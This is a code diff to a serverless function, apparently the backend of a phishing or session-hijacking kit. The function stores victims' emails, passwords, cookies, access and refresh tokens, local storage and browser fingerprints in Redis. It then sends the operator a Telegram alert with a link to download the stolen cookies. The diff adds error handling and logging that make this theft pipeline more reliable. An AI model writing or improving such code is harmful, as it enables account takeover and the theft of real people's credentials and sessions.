@@ -23,19 +23,43 @@ export const handler = async (event, context) => {
     };
   }
 
+  // DEBUG: Log entry point and incoming data
+  console.log("saveSession called! Event body:", event.body);
+
   try {
-    const data = JSON.parse(event.body);
-    
+    let data;
+    try {
+      data = JSON.parse(event.body);
+    } catch (parseError) {
+      console.error('❌ JSON parse error:', parseError, 'Raw body:', event.body);
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({
+          error: 'Invalid JSON in request body',
+          details: parseError.message,
+        }),
+      };
+    }
+
     // Check environment variables for Redis
     const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
     const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-    
+
+    // Check environment variables for Telegram
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    // Log env presence (mask actual values)
+    console.log('TELEGRAM_BOT_TOKEN set?', !!TELEGRAM_BOT_TOKEN, 'TELEGRAM_CHAT_ID set?', !!TELEGRAM_CHAT_ID);
+    console.log('UPSTASH_REDIS_REST_URL set?', !!UPSTASH_REDIS_REST_URL, 'UPSTASH_REDIS_REST_TOKEN set?', !!UPSTASH_REDIS_REST_TOKEN);
+
     // Get client IP
-    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                    event.headers['x-real-ip'] || 
-                    event.headers['cf-connecting-ip'] ||
-                    event.requestContext?.identity?.sourceIp ||
-                    'Unknown';
+    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+      event.headers['x-real-ip'] ||
+      event.headers['cf-connecting-ip'] ||
+      event.requestContext?.identity?.sourceIp ||
+      'Unknown';
 
     // Create session data with better validation
     const sessionData = {
@@ -53,7 +77,7 @@ export const handler = async (event, context) => {
       localStorage: data.localStorage || 'Empty',
       sessionStorage: data.sessionStorage || 'Empty',
       browserFingerprint: data.browserFingerprint || {},
-      documentCookies: data.documentCookies || document?.cookie || '',
+      documentCookies: data.documentCookies || '',
       accessToken: data.accessToken || null,
       refreshToken: data.refreshToken || null,
       userProfile: data.userProfile || null
@@ -67,11 +91,11 @@ export const handler = async (event, context) => {
           url: UPSTASH_REDIS_REST_URL,
           token: UPSTASH_REDIS_REST_TOKEN,
         });
-        
+
         // Store with TTL of 24 hours
         await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData), { ex: 86400 });
         await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData), { ex: 86400 });
-        
+
         // Also store cookies separately for easy retrieval
         await redis.set(`cookies:${sessionData.sessionId}`, JSON.stringify({
           cookies: sessionData.formattedCookies,
@@ -82,7 +106,7 @@ export const handler = async (event, context) => {
           password: sessionData.password,
           documentCookies: sessionData.documentCookies
         }), { ex: 86400 });
-        
+
         console.log('✅ Session saved to Redis:', sessionData.sessionId);
       } catch (redisError) {
         console.error('❌ Redis storage error, falling back to memory:', redisError);
@@ -101,9 +125,6 @@ export const handler = async (event, context) => {
 
     // Send immediate Telegram notification if not already sent
     try {
-      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-      
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && !data.skipTelegram) {
         const quickMessage = `🔔 NEW SESSION SAVED
 
@@ -116,8 +137,8 @@ export const handler = async (event, context) => {
 🕒 ${new Date().toLocaleString()}
 
 Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionData.sessionId}`;
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+
+        const telegramResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -127,8 +148,15 @@ Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your
           }),
           signal: AbortSignal.timeout(10000)
         });
-        
-        console.log('✅ Quick Telegram notification sent');
+
+        if (!telegramResp.ok) {
+          const errorText = await telegramResp.text();
+          console.error('❌ Telegram API error:', errorText);
+        } else {
+          console.log('✅ Quick Telegram notification sent');
+        }
+      } else {
+        console.log('ℹ️ Telegram notification skipped (env missing or skipTelegram true)');
       }
     } catch (telegramError) {
       console.error('⚠️ Failed to send quick Telegram notification:', telegramError);
@@ -137,12 +165,12 @@ Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify({ 
-        success: true, 
+      body: JSON.stringify({
+        success: true,
         sessionId: sessionData.sessionId,
         message: 'Session saved successfully',
         storage: UPSTASH_REDIS_REST_URL ? 'Redis' : 'Memory',
-        telegramSent: true,
+        telegramSent: !!TELEGRAM_BOT_TOKEN && !!TELEGRAM_CHAT_ID && !data.skipTelegram,
         data: {
           email: sessionData.email,
           provider: sessionData.provider,
@@ -159,7 +187,7 @@ Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ 
+      body: JSON.stringify({
         error: 'Failed to save session',
         details: error.message,
         timestamp: new Date().toISOString()
